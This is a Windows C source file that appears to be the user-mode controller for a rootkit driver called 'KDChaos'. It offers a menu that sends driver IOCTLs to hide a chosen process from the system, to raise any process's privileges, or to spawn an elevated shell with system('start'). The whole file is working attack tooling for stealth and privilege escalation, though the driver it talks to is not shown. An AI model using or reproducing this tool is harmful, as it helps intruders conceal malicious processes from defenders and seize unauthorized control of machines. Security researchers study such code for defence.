#include <Windows.h>
#include <stdio.h>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)

int
isProcessRunning(
	int pid
)
{
	HANDLE phandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (!phandle)
		return (-1);
	CloseHandle(phandle);
	return (0);

}

int
wmain(
	void
)
{
	int option,pid = 0;
	printf("1. Hide specific process\n2. Spawn an elevated process\n3. Elevate a specific process\nPlease enter your choice: ");
	scanf_s("%d", &option);


	if (option == 1 || option == 3)
	{
		printf("Enter process ID (pid) :");
		scanf_s("%d", &pid);
	}
	else if (option == 2)
	{
		pid = GetCurrentProcessId();
	}
	else
	{
		printf("Invalid Option !\n");
		return (-1);
	}

	DWORD lpBytesReturned;

	HANDLE hdevice = CreateFile(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hdevice == INVALID_HANDLE_VALUE)
	{
		printf("failed to open device\n");
		return (-1);
	}
	else
		printf("driver device opened\n");

	if (option == 1)
	{
		if (DeviceIoControl(hdevice, HIDE_PROC, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, nullptr))
			printf("IOCTL %x sent!\n", HIDE_PROC);
		else
		{
			printf("Failed to send the IOCTL %x.\n", HIDE_PROC);
			return (-1);
		}
		if (!lpBytesReturned)
		{
			printf("The process %d has been hidden.\n", pid);
		}
		else
		{
			if (!isProcessRunning(pid))
				printf("Failed to hide the process.\n");
			else
				printf("Invalid process ID (pid). Please make sure to provide a valid pid.\n");
			return (-1);
		}
	}
	if (option == 3 || option == 2)
	{
		if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, nullptr))
			printf("IOCTL %x sent!\n", PRIVILEGE_ELEVATION);
		else
		{
			printf("Failed to send the IOCTL %x.\n", PRIVILEGE_ELEVATION);
			return (-1);
		}
		if (!lpBytesReturned)
		{
			printf("The privilege of process %d has been elevated.\n", pid);
		}
		else
		{
			if (!isProcessRunning(pid))
				printf("Failed to elevate the process %d.\n",pid);
			else
				printf("Invalid process ID (pid). Please make sure to provide a valid pid.\n");
			return (-1);
		}
	}
	if (pid == GetCurrentProcessId())
	{
		system("start");
		printf("Privileged process spawned successfully\n");
	}
	CloseHandle(hdevice);
	system("pause");
	return (0);
}
